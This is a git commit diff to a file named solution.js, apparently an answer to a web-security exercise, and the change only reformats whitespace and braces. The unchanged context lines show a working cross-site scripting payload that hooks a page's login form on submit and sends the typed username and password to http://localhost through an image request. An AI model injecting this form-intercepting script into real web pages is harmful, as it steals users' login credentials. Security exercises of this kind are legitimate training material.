55e44153eb6f641b41c866a2a46b478dfb398c64
h3ll0clar1c3 <61941106+h3ll0clar1c3@users.noreply.github.com>
2021-05-31 18:57:17 +0200

    Update solution.js

--- solution.js
+++ solution.js
@@ -28,15 +28,14 @@ for  (i=0; i < links.length; i++)
 
 <script>
 
-function InterceptForm() {
+function InterceptForm() 
+
+{
 	var username = document.forms[0].elements[0].value;
 	var password = document.forms[0].elements[1].value;
 	new Image().src = "http://localhost/?username="+username+"&password="+password;
-
 }
 
-
 document.forms[0].onsubmit = InterceptForm;
-
 
 </script>
